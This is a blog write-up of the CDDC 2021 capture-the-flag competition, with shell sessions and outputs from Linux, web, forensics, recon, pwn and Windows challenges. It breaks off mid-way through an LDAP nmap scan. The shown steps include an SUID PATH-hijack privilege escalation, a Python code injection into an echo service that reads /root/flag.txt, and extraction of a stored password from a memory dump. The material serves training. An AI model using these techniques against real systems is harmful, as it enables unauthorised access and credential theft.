---
title: "CDDC 2021"
slug: "cddc-2021"
description: "Writeup for CDDC 2021"
cover: "/static/content/cddc-2021/cover.png"
featured: false
published: "2021-06-30"
tags: ["CTF", "writeup"]
---

# CDDC 2021 Writeup

24th June 2021 1000H - 25th June 2021 2200H

This is the second official CTF that I competed in, and was frankly a less than ideal experience. The CTF was originally meant to be held between 23rd June 1000 - 25th June 1000, however, technical glitches left participants in a waiting game for the first 24 hours. Notwithstanding that, several participants were able to gain access to challenges hosted outside of the challenge platform, effectively giving these teams a 24 hour head start. By the time the CTF started, my team was already demoralised and tired from the waiting.

We pushed on nonetheless and tried all the challenges. During this CTF, I attempted all the categories available:

- Linux
- Web
- Forensics
- Recon
- Pwn
- Windows
- Crypto
- RE
- OSINT

However, I found limited success with the Web, Recon and OSINT challenges. For many of them, it felt like I was in the right direction, but there just seemed to be a missing final piece that was needed to get the flag, and this definitely contributed to the frustrations of this CTF that seemed so manageable.

As for the remainder of the challenges, Forensics and Windows for me saw the most success where I was able to apply my Blue team skills and OSCP methodology to Windows pentesting. (More in my write-up above)

Overall, placing 42nd/400+ wasn't bad considering how new the team was to the CTF scene. With that being said, there is definitely much to learn moving forward.

![](/static/content/cddc-2021/results.png)

iPhantasmic

---

# Linux Rules The World

## 1. Opening the Gate (bot1)

50 Points

One of TheKeepers has successfully obtained what seems to be one of the GDC private servers. He has sent me the image and another file, but unfortunately, I’m not great with Linux. I think you’re the one for this mission.

Target IP: 13.213.192.83

[file.zip](/static/content/cddc-2021/file.zip)

```bash
chmod 600 bot1.key
ssh -i bot1.key bot1@13.213.192.83
Passphrase: q1w2e3r4

bot1@cybot02:~$ cat flag.txt 
CDDC21{S$H_keYs_are_Be!ter_than_PaSSw0rds}
```

## 2. Scrambled Eggs (bot2)

200 Points

Now you’re asking me what are all of these strings? This file looks like scrambled eggs to me. Those crazy Cybots always try to make it harder.

Hint #1: Try to use a pattern to find the right string.

```bash
su bot2
Password: CDDC21{S$H_keYs_are_Be!ter_than_PaSSw0rds}
cd

bot2@cybot02:~$ cat data | grep CDDC21{ | grep }
CDDC21{Th1s_!s_IT}
```

## 3. Another Path (bot3)

300 Points

You must continue and pwn this machine. Please don’t bother me with all those bots. I know they’re connected somehow. If you feel stuck, try to take another path.

Hint #1: Maybe bot4 has some special files that might help you.

```bash
su bot3
Password: CDDC21{Th1s_!s_IT}

# /home/bot3/flag.txt is owned by bot4 and 'root' group hence, this is likely an SUID + PATH variable challenge as suggested in the challenge description

find / -uid 0 -perm -4000 -type f 2>/dev/null
# with the above command, we will find /usr/local/bin/systeminfo which is world executable and owned by bot4
strings /usr/local/bin/systeminfo
# we then see that there is a use of absolute paths for several system binaries, except for id, we can then exploit this
```

```bash
cd /dev/shm
vim id
# contains: cat /home/bot3/flag.txt

chmod 777 id

# prepend location of our id to PATH
PATH=/dev/shm:$PATH

# now with the preprended /dev/shm path to our own version of id, we get flag
/usr/local/bin/systeminfo 
System information...

[*] Date:
Wed Jun 23 07:26:18 UTC 2021

[*] Kernel:
5.8.0-1035-aws

[*] User infomation:
CDDC21{SU1d_!s_Qu1Te_DangeRouS}
```

![](/static/content/cddc-2021/Untitled.png)

## ~~4. Hidden Info (bot4)~~ (unsolved)

300 Points

Every piece of information is hidden somewhere. Believe me, I wish I could help you.

```bash
su bot4
Password: CDDC21{SU1d_!s_Qu1Te_DangeRouS}

cd /dev/shm
cat /home/bot4/flag > ./flag
chmod 777

scp -i bot1.key bot1@13.213.192.83:/dev/shm/flag ./CDDC21/Linux/

strace ./flag

execve("./flag", ["./flag"], 0x7ffe94a93e30 /* 25 vars */) = 0
brk(NULL)                               = 0x55d4df30c000
arch_prctl(0x3001 /* ARCH_??? */, 0x7ffd6b286280) = -1 EINVAL (Invalid argument)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=23698, ...}) = 0
mmap(NULL, 23698, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f53efaba000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\360q\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
pread64(3, "\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0", 32, 848) = 32
pread64(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\t\233\222%\274\260\320\31\331\326\10\204\276X>\263"..., 68, 880) = 68
fstat(3, {st_mode=S_IFREG|0755, st_size=2029224, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f53efab8000
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
pread64(3, "\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0", 32, 848) = 32
pread64(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\t\233\222%\274\260\320\31\331\326\10\204\276X>\263"..., 68, 880) = 68
mmap(NULL, 2036952, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f53ef8c6000
mprotect(0x7f53ef8eb000, 1847296, PROT_NONE) = 0
mmap(0x7f53ef8eb000, 1540096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x25000) = 0x7f53ef8eb000
mmap(0x7f53efa63000, 303104, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x19d000) = 0x7f53efa63000
mmap(0x7f53efaae000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7f53efaae000
mmap(0x7f53efab4000, 13528, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f53efab4000
close(3)                                = 0
arch_prctl(ARCH_SET_FS, 0x7f53efab9540) = 0
mprotect(0x7f53efaae000, 12288, PROT_READ) = 0
mprotect(0x55d4ddf49000, 4096, PROT_READ) = 0
mprotect(0x7f53efaed000, 4096, PROT_READ) = 0
munmap(0x7f53efaba000, 23698)           = 0
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x1), ...}) = 0
brk(NULL)                               = 0x55d4df30c000
brk(0x55d4df32d000)                     = 0x55d4df32d000
write(1, "Dude, where is my flag?\n", 24Dude, where is my flag?
) = 24
exit_group(0)                           = ?
+++ exited with 0 +++
```

---

# Web Takedown Episode 1

## 1. AccessKey

200 Points

Your next target doesn’t look so interesting, but maybe there is a hidden secret somewhere that can be used as the access key

**Target URL: http://122.248.246.76/YY67RIGZ**

Hint #1: Find the secret.js file and try to figure out how you can decode it.

![Seems like we have a not so secret 'secret.js' to explore](/static/content/cddc-2021/Untitled%201.png)

Seems like we have a not so secret 'secret.js' to explore

```bash
var pass = unescape("unescape%28%22String.fromCharCode%252867%252C68%252C68%252C67%252C50%252C49%252C123%252C95%252C32%252C68%252C101%252C48%252C98%252C102%252C117%252C36%252C99%252C97%252C116%252C101%252C100%252C45%252C70%252C33%252C97%252C71%252C95%252C125%2529%22%29");
```

![Looking at the source, we see some obfuscated data that looks like URL encoding](/static/content/cddc-2021/Untitled%202.png)

Looking at the source, we see some obfuscated data that looks like URL encoding

[URL Decoder/Encoder](https://meyerweb.com/eric/tools/dencoder/)

![Decoded twice](/static/content/cddc-2021/Untitled%203.png)

Decoded twice

```bash
67,68,68,67,50,49,123,95,32,68,101,48,98,102,117,36,99,97,116,101,100,45,70,33,97,71,95,125
```

[Convert Ascii Numbers to Text online](https://convert.town/ascii-to-text)

![](/static/content/cddc-2021/Untitled%204.png)

```bash
CDDC21{_ De0bfu$cated-F!aG_}
```

## ~~2. Integrity~~ (unsolved)

400 Points

We got an intel that Cyber-Bots develop a new integrity system. The server will be used further for malicious proposes, and we must stop it. Try to find any manipulation that can be done by the client-side of it.

**Target URL: http://122.248.246.76/8NR7Z67K**

![](/static/content/cddc-2021/Untitled%205.png)

![](/static/content/cddc-2021/Untitled%206.png)

---

# Post-Mortem (Forensics)

## 1. Look Closer

100 Points

The resistance managed to find a suspicious file. They believe it contains some useful data. Unfortunately, they weren’t able to retrieve it. Help them find what they are looking for. 

Hint #1: If only xxd could do the opposite…

[data.txt](/static/content/cddc-2021/data.txt)

```bash
base64 -d data.txt > hexdump.txt
```

![](/static/content/cddc-2021/Untitled%207.png)

```bash
xxd -r hexdump.txt binary
```

![Using a hex editor, let's replace CDDC with the correct ELF file headers](/static/content/cddc-2021/Untitled%208.png)

Using a hex editor, let's replace CDDC with the correct ELF file headers

![](/static/content/cddc-2021/Untitled%209.png)

```bash
CDDC21{C@n_Y0u_F1nD_mE?}
```

## 2. Long time no Sea

400 Points

The GDC is known to operate from the sea, but the resistance has not been able to locate the yacht they use. A USB key was found on one of the destroyed bots, along with a CANOIN camera that had been destroyed. Your task as the digital forensic specialist is to find evidence that can show the resistance where to find that yacht. They have provided you with an image of the USB key.

**Note: You need to insert the answer to the flag format CDDC21{answer}**

Hint #1: What the hell is EVF?

[We are given what looks to be a USB image](/static/content/cddc-2021/0x0702SMIS2.dd)

We are given what looks to be a USB image

```bash
file 0x0702SMIS2.DD 
0x0702SMIS2.DD: EWF/Expert Witness/EnCase image file format

# Since this is an EnCase/EWF image file we can use the .E01 extension
mv 0x0702SMIS2.DD challenge.E01

ewfinfo ./challenge.E01 
ewfinfo 20140807

Acquiry information
        Case number:            OLAF2
        Description:            Suspect USB
        Examiner name:          RT
        Evidence number:        2
        Notes:                  2GB USB
        Acquisition date:       Tue Apr 27 16:07:48 2021
        System date:            Tue Apr 27 16:07:48 2021
        Operating system used:  Win 201x
        Software version used:  ADI4.3.0.18
        Password:               N/A

EWF information
        File format:            FTK Imager
        Sectors per chunk:      64
        Compression method:     deflate
        Compression level:      no compression

Media information
        Media type:             fixed disk
        Is physical:            yes
        Bytes per sector:       512
        Number of sectors:      3915776
        Media size:             1.8 GiB (2004877312 bytes)

Digest hash information
        MD5:                    2ea6a3a03dec68198d897dfc1e4b2f83
        SHA1:                   1dab5bbd3fae00cc29d7b2214e66cb8783474640
```

![Since we know that it is created using FTK Imager, we can just mount this in FTK to take a look](/static/content/cddc-2021/Untitled%2010.png)

Since we know that it is created using FTK Imager, we can just mount this in FTK to take a look

![](/static/content/cddc-2021/Untitled%2011.png)

![](/static/content/cddc-2021/Untitled%2012.png)

<aside>
💡 From the mounted image, there were no interesting files, until we look at the unallocated space, which tells us that this data was likely deleted. More interestingly, we see that there is a JFIF file header, suggesting some images are stored, perhaps we could recover those.

</aside>

![Exporting that data block is sufficient](/static/content/cddc-2021/Untitled%2013.png)

Exporting that data block is sufficient

```bash
# open ftk imager, look at unallocated space, extract first block
binwalk --dd='.*' 001416 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
102400        0x19000         JPEG image data, JFIF standard 1.01
159744        0x27000         7-zip archive data, version 0.4
548864        0x86000         Zip archive data, at least v2.0 to extract, compressed size: 67669, uncompressed size: 67760, name: cam1.jpg
616571        0x9687B         Zip archive data, at least v2.0 to extract, compressed size: 426622, uncompressed size: 426706, name: spy.txt
1043230       0xFEB1E         Zip archive data, at least v2.0 to extract, compressed size: 194214, uncompressed size: 195010, name: spygadgets.jpg
1237763       0x12E303        End of Zip archive, footer length: 22
1241088       0x12F000        JPEG image data, JFIF standard 1.01
1241118       0x12F01E        TIFF image data, big-endian, offset of first image directory: 8
1248430       0x130CAE        TIFF image data, little-endian offset of first image directory: 734
```

![A password? Perhaps it is for the .zip archives that were extracted](/static/content/cddc-2021/Untitled%2014.png)

A password? Perhaps it is for the .zip archives that were extracted

![Extracted using 'skipper123' as password](/static/content/cddc-2021/Untitled%2015.png)

Extracted using 'skipper123' as password

![](/static/content/cddc-2021/Untitled%2016.png)

![The challenge was slightly vague in that it asked us where we could find the yacht, and I initially tried to find some EXIF data from these images but there were none. That was when it struck me that the name of the yacht could be what we were after.](/static/content/cddc-2021/Untitled%2017.png)

The challenge was slightly vague in that it asked us where we could find the yacht, and I initially tried to find some EXIF data from these images but there were none. That was when it struck me that the name of the yacht could be what we were after.

```bash
CDDC21{OLAF}
```

## 3. Default Password

300 Points

Members of TheKeepers got their hands on one of the GDC computers. They created a memory dump of the system as they believe it might contain some juicy information. Help them find proof.

Hint #1: What was that profile again?

**Challenge File: data1.txt**

```bash
volatility -f data imageinfo
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/kali/Desktop/CDDC21/Forensics/3. Default Password/data)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002a2f130L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002a31000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2021-05-26 13:26:07 UTC+0000
     Image local date and time : 2021-05-26 06:26:07 -0700
```

![](/static/content/cddc-2021/Untitled%2018.png)

```bash
volatility -f data --profile Win7SP1x64 lsadump
Volatility Foundation Volatility Framework 2.6
DefaultPassword
0x00000000  2e 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x00000010  54 00 68 00 31 00 73 00 5f 00 69 00 24 00 5f 00   T.h.1.s._.i.$._.
0x00000020  41 00 5f 00 4c 00 30 00 6e 00 67 00 5f 00 70 00   A._.L.0.n.g._.p.
0x00000030  40 00 73 00 24 00 77 00 30 00 72 00 64 00 00 00   @.s.$.w.0.r.d...

DPAPI_SYSTEM
0x00000000  2c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ,...............
0x00000010  01 00 00 00 2b 1e a9 10 69 4a 89 05 67 80 76 73   ....+...iJ..g.vs
0x00000020  4e 02 1d b8 25 f0 99 5e 1b 86 ba f6 01 87 ae 06   N...%..^........
0x00000030  fe 1d 0a 7a 96 71 84 fb 0f 03 d2 b0 00 00 00 00   ...z.q..........
```

![](/static/content/cddc-2021/Untitled%2019.png)

```bash
CDDC21{Th1s_i$_A_L0ng_p@s$w0rd}
```

---

# Going Active (Recon)

## 1. UnKnown

200 Points

This GDC’s public server seems to run an unknown service. I tried to enumerate this service, but I can’t find its version. Find this strange service and see if you can find its version.

**Target IP Address: 13.213.94.233**

Hint #1: If tools like Nmap can’t find the service version, it worth checking it manually.

```bash
nmap -p- -sC -sV 13.213.94.233
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-24 11:35 +08
Stats: 0:03:17 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 19.09% done; ETC: 11:52 (0:13:25 remaining)
Nmap scan report for ec2-13-213-94-233.ap-southeast-1.compute.amazonaws.com (13.213.94.233)
Host is up (0.0043s latency).
Not shown: 65502 filtered ports, 29 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
666/tcp  open  doom?
| fingerprint-strings: 
|   NULL: 
|     file.tarUT 
|     CpwKpw_
|     YHpw
|     \xcb.
|     )n<~^
|     a'ufv
|     .qV*a4
|     5@u0
|     T'dp
|     \x04m
|     \xb2
|     \x11.
|     }}so
|_    ~8VB
8080/tcp open  http    PHP cli server 5.5 or later
|_http-title: 404 Not Found

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1320.99 seconds

wget 13.213.94.233:666
# Pulling it through HTTP gets us the data in index.html

file index.html
# This tells us that it is indeed a tar archive

mv index.html index.zip
# Let's rename the archive and open it up
```

[index.zip](/static/content/cddc-2021/index.zip)

![](/static/content/cddc-2021/Untitled%2020.png)

![](/static/content/cddc-2021/Untitled%2021.png)

![file.png](/static/content/cddc-2021/file.png)

file.png

```bash
CDDC21{Y0u_Figu4ed_IT_0UT}
```

## ~~2. Mounting~~ (unsolved)

200 Points

I don’t know what this server is used for, It doesn’t look like a web server, but I’m sure that the GDC uses this machine for their hostile activities.

**Target IP Address: 178.128.118.134**

```bash
# Nmap 7.80 scan initiated Thu Jun 24 13:17:53 2021 as: nmap -sC -sV -oN mounting.txt 178.128.118.134
Nmap scan report for 178.128.118.134
Host is up (0.0052s latency).
Not shown: 990 closed ports
PORT     STATE    SERVICE     VERSION
21/tcp   open     ftp         vsftpd 3.0.3
22/tcp   open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
111/tcp  open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37021/udp   mountd
|   100005  1,2,3      43857/tcp6  mountd
|   100005  1,2,3      51387/tcp   mountd
|   100005  1,2,3      57524/udp6  mountd
|   100021  1,3,4      34319/tcp6  nlockmgr
|   100021  1,3,4      34790/udp6  nlockmgr
|   100021  1,3,4      46105/tcp   nlockmgr
|   100021  1,3,4      53127/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  filtered netbios-ssn
161/tcp  filtered snmp
179/tcp  filtered bgp
445/tcp  open     netbios-ssn Samba smbd 4.6.2
646/tcp  filtered ldp
2049/tcp open     nfs_acl     3 (RPC #100227)
4444/tcp filtered krb524
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-24T05:18:12
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 24 13:18:15 2021 -- 1 IP address (1 host up) scanned in 21.89 seconds
```

```bash
nmap --script "nfs-*" 178.128.118.134
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-25 18:07 +08                                                                
Nmap scan report for 178.128.118.134                                                                                           
Host is up (0.0047s latency).                                                                                                  
Not shown: 990 closed ports                                                                                                    
PORT     STATE    SERVICE                                                                                                      
21/tcp   open     ftp                                                                                                          
22/tcp   open     ssh                                                                                                          
111/tcp  open     rpcbind                                                                                                      
| nfs-showmount: 
|_  /var/nfs/backup *
139/tcp  filtered netbios-ssn
161/tcp  filtered snmp
179/tcp  filtered bgp
445/tcp  open     microsoft-ds
646/tcp  filtered ldp
2049/tcp open     nfs
4444/tcp filtered krb524

# Somehow unable to mount, giving error of no permissions.
```

---

# File It Away (Pwn)

## 1. Length Matters?

200 Points

You are provided with credentials to a GDC server. It has an executable file that might reveal some juicy info. Find a way to exploit it.

**Target: 18.136.182.104 port 60210**

Hint #1: ZSH is a nice shell!

```bash
nc -nv 18.136.182.104 60210

cat gdc_exec.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
        char command[50];
        char pref[] = "zsh -c ";

        if (argc == 1) return 0;

        bzero(command, 50);
        strcpy(command, pref);

        strncpy(command + strlen(command), argv[1], 3);

        setreuid(geteuid(), geteuid());

        system(command);

        return 0;
}

ls -al
total 80
drwxr-x--- 1 0 1000  4096 Jun 21 10:50 .
drwxr-x--- 1 0 1000  4096 Jun 21 10:50 ..
-rwxr-x--- 1 0 1000   220 Aug 31  2015 .bash_logout
-rwxr-x--- 1 0 1000  3771 Aug 31  2015 .bashrc
-rwxr-x--- 1 0 1000   655 Jul 12  2019 .profile
drwxr-x--- 1 0 1000  4096 Jun 21 10:50 bin
drwxr-x--- 1 0 1000  4096 Jun 21 10:50 dev
-r-------- 1 0 1000    27 Jun  1 06:39 flag
-rwsr-x--x 1 0    0 16976 Jun  1 06:11 gdc_exec
-rwxr-x--- 1 0 1000   351 Jun  1 12:40 gdc_exec.c
-rwxr-x--- 1 0 1000  8648 Jun 11 06:52 helloworld
drwxr-x--- 1 0 1000  4096 Jun 21 10:50 lib
drwxr-x--- 1 0 1000  4096 Jun 21 10:50 lib32
drwxr-x--- 1 0 1000  4096 Jun 21 10:50 lib64
```

```bash
CDDC21{0nly_thr33_ch@rs??}
```

## 3. POP IT

300 Points

Your last mission, for now, looks promising. It’s some kind of an echo server. I think you can exploit it easily.

**Target: 18.136.182.104 port 60230**

Hint #1: First, you need to find the correct offset. Try to send a unique pattern to find the offset.

```bash
nc 18.136.182.104 60230

Welcome to our awesome echo server!
# Find breaking point using a long string, then we can run Python code without  restrictions
input> 01234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901import os;raise Exception(os.listdir(os.getcwd()));

Exception:
['lib64', 'opt', 'tmp', 'usr', 'home', 'run', 'libx32', 'proc', 'srv', 'var', 'dev', 'media', 'boot', 'lib', 'root', 'etc', 'sbin', 'bin', 'mnt', 'lib32', 'sys', 'output3.txt', '.dockerenv']
# /root is a typical place to find flags for CTFs and boxes
input> 01234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901import os;raise Exception(os.listdir('/root'));

Exception:
['.bashrc', '.profile', 'buffer_overflow.py', 'exploit.sh', 'memory', 'flag.txt']

input> 01234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901import os;raise Exception(open('/root/flag.txt', 'r').read());                                                                                                   
                                                                                                                                        
Exception:                                                                                                                              
CDDC21{Py780n_!$_N!c3}
```

---

# Behind the Mask (Windows)

## 1. Light

200 Points

It’s time to expose the GDC! We have successfully obtained the IP address of their AD server. First, try to list the different users that are configured on the server.

**Target IP Address: 18.136.74.102**

**Hint #1:	You can find information about the users using two different protocols. One of them is used to search in the AD database.**

[389, 636, 3268, 3269 - Pentesting LDAP](https://book.hacktricks.xyz/pentesting/pentesting-ldap)

```bash
# Find services running on AD
nmap -sC -sV 18.136.74.102 -Pn -oN ldapenum.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-24 21:19 +08
Nmap scan report for ec2-18-136-74-102.ap-southeast-1.compute.amazonaws.com (18.136.74.102)
Host is up (0.0069s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-24 13:19:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: gdc.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: GDC)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: gdc.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GDC
|   NetBIOS_Domain_Name: GDC
|   NetBIOS_Computer_Name: GDC-DC-S
|   DNS_Domain_Name: gdc.local
|   DNS_Computer_Name: GDC-DC-S.gdc.local
|   DNS_Tree_Name: gdc.local
|   Product_Version: 10.0.14393
|_  System_Time: 2021-06-24T13:21:41+00:00
| ssl-cert: Subject: commonName=GDC-DC-S.gdc.local
| Not valid before: 2021-06-17T22:16:39
|_Not valid after:  2021-12-17T22:16:39
|_ssl-date: 2021-06-24T13:22:21+00:00; +1s from scanner time.                                                        
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/24%Time=60D48662%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: GDC-DC-S; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: GDC-DC-S
|   NetBIOS computer name: GDC-DC-S\x00
|   Domain name: gdc.local
|   Forest name: gdc.local
|   FQDN: GDC-DC-S.gdc.local
|_  System time: 2021-06-24T13:21:42+00:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-06-24T13:21:45
|_  start_date: 2021-06-24T13:09:17

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 317.45 seconds
```

- ldapenum.txt
    
    ```bash
    # Nmap 7.80 scan initiated Thu Jun 24 21:33:44 2021 as: nmap -n -sV --script "ldap* and not brute" -Pn -oN ldapenum.txt 18.136.74.102
    Nmap scan report for 18.136.74.102
    Host is up (0.0041s latency).
    Not shown: 989 filtered ports
    PORT     STATE SERVICE       VERSION
    53/tcp   open  domain?
    | fingerprint-strings: 
    |   DNSVersionBindReqTCP: 
    |     version
    |_    bind
    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-24 13:33:55Z)
    135/tcp  open  msrpc         Microsoft Windows RPC
    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: gdc.local, Site: Default-First-Site-Name)
    | ldap-rootdse: 
    | LDAP Results
    |   <ROOT>
    |       currentTime: 20210624133610.0Z
    |       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |       dsServiceName: CN=NTDS Settings,CN=GDC-DC-S,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=gdc,DC=local
    |       namingContexts: DC=gdc,DC=local
    |       namingContexts: CN=Configuration,DC=gdc,DC=local
    |       namingContexts: CN=Schema,CN=Configuration,DC=gdc,DC=local
    |       namingContexts: DC=DomainDnsZones,DC=gdc,DC=local
    |       namingContexts: DC=ForestDnsZones,DC=gdc,DC=local
    |       defaultNamingContext: DC=gdc,DC=local
    |       schemaNamingContext: CN=Schema,CN=Configuration,DC=gdc,DC=local
    |       configurationNamingContext: CN=Configuration,DC=gdc,DC=local
    |       rootDomainNamingContext: DC=gdc,DC=local
    |       supportedControl: 1.2.840.113556.1.4.319
    |       supportedControl: 1.2.840.113556.1.4.801
    |       supportedControl: 1.2.840.113556.1.4.473
    |       supportedControl: 1.2.840.113556.1.4.528
    |       supportedControl: 1.2.840.113556.1.4.417
    |       supportedControl: 1.2.840.113556.1.4.619
    |       supportedControl: 1.2.840.113556.1.4.841
    |       supportedControl: 1.2.840.113556.1.4.529
    |       supportedControl: 1.2.840.113556.1.4.805
    |       supportedControl: 1.2.840.113556.1.4.521
    |       supportedControl: 1.2.840.113556.1.4.970
    |       supportedControl: 1.2.840.113556.1.4.1338
    |       supportedControl: 1.2.840.113556.1.4.474
    |       supportedControl: 1.2.840.113556.1.4.1339
    |       supportedControl: 1.2.840.113556.1.4.1340
    |       supportedControl: 1.2.840.113556.1.4.1413
    |       supportedControl: 2.16.840.1.113730.3.4.9
    |       supportedControl: 2.16.840.1.113730.3.4.10
    |       supportedControl: 1.2.840.113556.1.4.1504
    |       supportedControl: 1.2.840.113556.1.4.1852
    |       supportedControl: 1.2.840.113556.1.4.802
    |       supportedControl: 1.2.840.113556.1.4.1907
    |       supportedControl: 1.2.840.113556.1.4.1948
    |       supportedControl: 1.2.840.113556.1.4.1974
    |       supportedControl: 1.2.840.113556.1.4.1341
    |       supportedControl: 1.2.840.113556.1.4.2026
